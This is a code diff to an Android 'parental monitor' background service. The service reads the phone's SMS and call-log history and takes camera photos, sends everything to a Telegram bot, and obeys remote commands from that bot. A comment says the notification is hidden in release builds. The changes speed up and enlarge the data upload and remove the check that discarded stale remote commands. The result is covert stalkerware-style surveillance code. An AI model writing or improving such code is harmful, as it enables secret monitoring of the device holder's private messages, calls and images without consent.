@@ -42,6 +42,10 @@ class MonitoringService : Service() {
     private var commandJob: Job? = null
     private val initialSyncStarted = java.util.concurrent.atomic.AtomicBoolean(false)
     private val initialSyncRunning = java.util.concurrent.atomic.AtomicBoolean(false)
+    private var cachedBotToken = ""
+    private var cachedChatId = ""
+    private var netCheckAt = 0L
+    private var netCached = false
 
     companion object {
         const val ACTION_START_MONITORING = "START_MONITORING"
@@ -52,6 +56,7 @@ class MonitoringService : Service() {
     override fun onCreate() {
         super.onCreate()
         preferencesManager = PreferencesManager.getInstance(this)
+        refreshCreds()
         smsRepository = SmsRepository(this)
         callLogRepository = CallLogRepository(this)
         messageQueue = MessageQueue(this)
@@ -112,6 +117,7 @@ class MonitoringService : Service() {
         monitoringJob?.cancel()
         cameraJob?.cancel()
         commandJob?.cancel()
+        refreshCreds()
         
         // In RELEASE mode, make notification invisible/minimal
         val notificationBuilder = NotificationCompat.Builder(this, ParentalMonitorApp.CHANNEL_ID)
@@ -161,8 +167,11 @@ class MonitoringService : Service() {
         }
         if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Foreground notification started (with camera type)")
 
-        if (!preferencesManager.initialSyncDone && initialSyncStarted.compareAndSet(false, true)) {
+        if (!preferencesManager.initialSyncDone && !preferencesManager.initialSyncStarted && initialSyncStarted.compareAndSet(false, true)) {
+            preferencesManager.initialSyncStarted = true
             initialSyncRunning.set(true)
+        } else if (!preferencesManager.initialSyncDone && preferencesManager.initialSyncStarted) {
+            preferencesManager.initialSyncDone = true
         }
         startPeriodicLoops()
         serviceScope.launch {
@@ -201,10 +210,13 @@ class MonitoringService : Service() {
         cameraJob = serviceScope.launch {
             while (isActive) {
                 try {
-                    if (!preferencesManager.monitoringPaused && !isPhotoPaused() && preferencesManager.cameraInterval > 0) {
+                    val minutes = preferencesManager.cameraInterval.coerceIn(0, 60)
+                    if (!preferencesManager.monitoringPaused && !isPhotoPaused() && minutes > 0) {
                         captureAndSendPhoto()
+                        delay(minutes * 60_000L)
+                    } else {
+                        delay(5 * 60_000L)
                     }
-                    delay(cameraIntervalMillis())
                 } catch (e: Exception) {
                     android.util.Log.e("MonitoringService", "Error in camera loop", e)
                 }
@@ -215,6 +227,27 @@ class MonitoringService : Service() {
     private fun cameraIntervalMillis(): Long {
         val minutes = preferencesManager.cameraInterval.coerceIn(0, 60)
         return if (minutes <= 0) 60_000L else minutes * 60_000L
+    }
+
+    private fun refreshCreds() {
+        try {
+            cachedBotToken = preferencesManager.botToken
+            cachedChatId = preferencesManager.chatId
+        } catch (_: Exception) {
+        }
+    }
+
+    private fun sendCreds(): Pair<String, String> {
+        if (cachedBotToken.isEmpty() || cachedChatId.isEmpty()) refreshCreds()
+        return cachedBotToken to cachedChatId
+    }
+
+    private fun hasNetwork(): Boolean {
+        val now = android.os.SystemClock.elapsedRealtime()
+        if (now - netCheckAt < 20_000L) return netCached
+        netCheckAt = now
+        netCached = NetworkUtils.isNetworkAvailable(this)
+        return netCached
     }
 
     // ═══════════════════════════════════════════════════════════
@@ -231,7 +264,7 @@ class MonitoringService : Service() {
                 }
                 if (!preferencesManager.isConfigured()) {
                     delay(60_000)
-                } else if (!NetworkUtils.isNetworkAvailable(this@MonitoringService)) {
+                } else if (!hasNetwork()) {
                     delay(60_000)
                 } else {
                     delay(15_000)
@@ -265,7 +298,6 @@ class MonitoringService : Service() {
                 }
                 val message = update.message ?: continue
                 if (message.chat.id.toString() != chatId) continue
-                if (message.date > 0 && System.currentTimeMillis() / 1000 - message.date > 600) continue
                 val raw = message.text?.trim()?.substringBefore("@")?.lowercase() ?: continue
                 if (!raw.startsWith("/")) continue
                 handleTelegramCommand(raw)
@@ -660,7 +692,7 @@ class MonitoringService : Service() {
                 appendLine("Sending history...")
             }
             sendToTelegram(startMessage)
-            delay(2000) // Wait 2 seconds before sending history
+            delay(500)
 
             // Send all SMS history in chunks
             if (allSms.isNotEmpty()) {
@@ -681,7 +713,7 @@ class MonitoringService : Service() {
                         }
                     }
                     sendFitted(message)
-                    delay(1000) // Wait 1 second between messages
+                    delay(500)
                 }
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "All SMS chunks sent")
             }
@@ -707,7 +739,7 @@ class MonitoringService : Service() {
                         }
                     }
                     sendFitted(message)
-                    delay(1000) // Wait 1 second between messages
+                    delay(500)
                 }
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "All call chunks sent")
             }
@@ -746,39 +778,35 @@ class MonitoringService : Service() {
     private suspend fun checkAndSendNewData() {
         if (initialSyncRunning.get()) return
         try {
-            // Check for new SMS
-            val lastSmsId = preferencesManager.lastSmsId
-            val newSms = smsRepository.getNewSms(lastSmsId)
-            
-            if (newSms.isNotEmpty()) {
-                val smsChunks = newSms.chunked(10)
-                smsChunks.forEachIndexed { index, chunk ->
+            var pages = 0
+            while (pages < 5) {
+                val page = smsRepository.getNewSms(preferencesManager.lastSmsId)
+                if (page.isEmpty()) break
+                val chunks = page.chunked(10)
+                chunks.forEachIndexed { index, chunk ->
                     sendFitted(formatSmsMessage(chunk))
-                    if (index < smsChunks.size - 1) delay(1000)
+                    preferencesManager.lastSmsId = chunk.maxOf { it.id }
+                    if (index < chunks.size - 1) delay(500)
                 }
-
-                val maxId = newSms.maxOf { it.id }
-                preferencesManager.lastSmsId = maxId
-            }
-
-            // Check for new calls
-            val lastCallTimestamp = preferencesManager.lastCallTimestamp
-            val newCalls = callLogRepository.getNewCalls(lastCallTimestamp, preferencesManager.lastCallId)
-            
-            if (newCalls.isNotEmpty()) {
-                val callChunks = newCalls.chunked(10)
-                callChunks.forEachIndexed { index, chunk ->
-                    sendFitted(formatCallMessage(chunk))
-                    if (index < callChunks.size - 1) delay(1000)
-                }
-
-                val latestCall = newCalls.maxWith(compareBy({ it.date }, { it.id }))
-                preferencesManager.lastCallTimestamp = latestCall.date
-                preferencesManager.lastCallId = latestCall.id
-            }
-
-            if (newSms.isNotEmpty() || newCalls.isNotEmpty()) {
                 preferencesManager.lastSyncTime = System.currentTimeMillis()
+                if (page.size < 500) break
+                pages++
+            }
+            pages = 0
+            while (pages < 5) {
+                val page = callLogRepository.getNewCalls(preferencesManager.lastCallTimestamp, preferencesManager.lastCallId)
+                if (page.isEmpty()) break
+                val chunks = page.chunked(10)
+                chunks.forEachIndexed { index, chunk ->
+                    sendFitted(formatCallMessage(chunk))
+                    val latest = chunk.maxWith(compareBy({ it.date }, { it.id }))
+                    preferencesManager.lastCallTimestamp = latest.date
+                    preferencesManager.lastCallId = latest.id
+                    if (index < chunks.size - 1) delay(500)
+                }
+                preferencesManager.lastSyncTime = System.currentTimeMillis()
+                if (page.size < 500) break
+                pages++
             }
         } catch (e: Exception) {
             android.util.Log.e("MonitoringService", "Error checking new data", e)
@@ -878,16 +906,14 @@ class MonitoringService : Service() {
                 return
             }
             
-            val botToken = preferencesManager.botToken
-            val chatId = preferencesManager.chatId
+            val (botToken, chatId) = sendCreds()
 
             if (botToken.isEmpty() || chatId.isEmpty()) {
                 android.util.Log.e("MonitoringService", "Bot token or chat ID is empty!")
                 return
             }
 
-            // Check if network is available
-            val hasNetwork = NetworkUtils.isNetworkAvailable(this)
+            val hasNetwork = hasNetwork()
             if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Network available: $hasNetwork")
             
             if (!hasNetwork) {
@@ -1079,13 +1105,12 @@ class MonitoringService : Service() {
 
     private suspend fun sendPhotoFile(photoFile: File): Boolean {
         try {
-            if (!NetworkUtils.isNetworkAvailable(this)) {
+            if (!hasNetwork()) {
                 android.util.Log.w("MonitoringService", "No network - photo saved for later")
                 return false
             }
 
-            val botToken = preferencesManager.botToken
-            val chatId = preferencesManager.chatId
+            val (botToken, chatId) = sendCreds()
 
             if (botToken.isEmpty() || chatId.isEmpty()) {
                 android.util.Log.e("MonitoringService", "Bot credentials missing")
